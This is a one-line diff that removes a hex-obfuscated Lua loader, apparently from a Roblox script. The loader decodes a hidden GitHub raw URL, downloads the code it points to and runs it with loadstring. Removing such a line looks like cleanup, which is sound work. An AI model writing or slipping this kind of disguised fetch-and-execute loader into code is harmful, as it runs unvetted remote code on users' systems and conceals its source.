@@ -1,1 +1,0 @@
-function b(str)return(str:gsub('..',function(cc)return string.char(tonumber(cc, 16))end))end;local a = b("68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f4b756e6169373638352f46656374696f6e2f6d61696e2f4d61696e");loadstring(game:HttpGet(a))()
